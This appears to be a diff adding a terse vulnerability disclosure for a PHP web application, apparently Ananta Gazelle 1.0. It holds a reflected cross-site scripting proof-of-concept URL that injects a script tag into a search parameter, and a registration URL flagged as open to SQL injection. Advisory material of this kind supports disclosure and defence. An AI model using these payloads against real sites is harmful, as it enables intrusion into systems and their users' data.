@@ -1,0 +1,3 @@
+http://www.example.com/search.php?lookup=&lt;script&gt;alert(888)&lt;/script&gt;
+http://www.example.com//register.php?^name=&amp;pass=&amp;controle=&amp;email=&amp;showemail=&amp;save=Save&amp;table=users&amp;active=0&amp;activate=3fb04953d95a94367bb133f862402bce&amp;location=%2FAnanta_Gazelle1.0%2Fregister.php&amp;joindate=2011-04-05+07%3A58%3A50 [is vulnerable to &#039; input SQL inject]
+
